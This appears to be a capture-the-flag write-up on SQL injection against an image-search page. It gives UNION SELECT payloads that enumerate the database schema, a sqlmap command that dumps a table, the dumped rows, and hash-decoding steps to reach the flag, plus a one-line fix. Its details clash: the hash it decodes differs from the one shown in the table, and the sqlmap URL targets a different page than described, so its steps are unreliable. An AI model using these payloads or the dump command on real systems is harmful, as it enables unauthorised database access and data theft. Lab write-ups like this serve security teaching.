# Sql Injection Images
- In the page /?page=searchimg there is a field to search images by their numbers (ids).

# Vulnerability
- We could imagine the SQL statement in back end is as follows:
```sql 
    SELECT * FROM list_images WHERE id = $_GET['id']
```
- We can enter some malicious input like this: 42 OR 1=1 this statment is always true so it will return ALL rows from the "list_images" table.

# Method 1
- We Can Use SQL Injection to find all tables of a database:
``` sql
1 UNION SELECT table_name, table_schema FROM information_schema.tables
```
- We Can Notice Something Like This:
    Title: Member_images
    Url : list_images

- We can try to find all columns
``` sql
1 UNION SELECT table_name, column_name FROM information_schema.columns
```
- We Notice The Table list_images from the [Url : list_images] output has these columns:
    __id, url, title, comment__

- We Know now __list_images__ columns, we can select __url, comment__:
``` sql
1 UNION select url, comment from list_images
```
- Notice This:
    Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
    Url : borntosec.ddns.net/images.png
- Converting 5ff9d0165b4f92b14994e5c685cdce28 to plain text is 'albatroz albatroz'.
- Converting 'albatroz albatroz' to sha256 is f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188 Which is Our Flag.


# Method 2
- Using 'sqlmap' to dump users data from list_images table:
sqlmap -u "http://192.168.1.38/?page=member&id=1&Submit=Submit#" -D Member_images -T list_images --dump
    
Database: Member_images
Table: list_images
[6 entries]
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
| id | url                              | title     | comment                                                                                                               |
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
| 1  | https://www.nsa.org/img.jpg      | Nsa       | An image about the NSA !                                                                                              |
| 2  | https://www.42.fr/42.png         | 42 !      | There is a number..                                                                                                   |
| 3  | https://www.google.fr/google.png | Google    | Google it !                                                                                                           |
| 4  | https://www.obama.org/obama.jpg  | Obama     | Yes we can !                                                                                                          |
| 5  | borntosec.ddns.net/images.png    | Hack me ? | If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 |
| 6  | https://www.h4x0r3.0rg/tr0ll.png | tr00l     | Because why not ?                                                                                                     |
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+

- Notice the comment: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
- Converting 5ff9d0165b4f92b14994e5c685cdce28 to plain text is 'albatroz albatroz'.
- Converting 'albatroz albatroz' to sha256 is f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188 Which is Our Flag.

# Fix
- We can prevent this by using prepared statements and parameterized queries.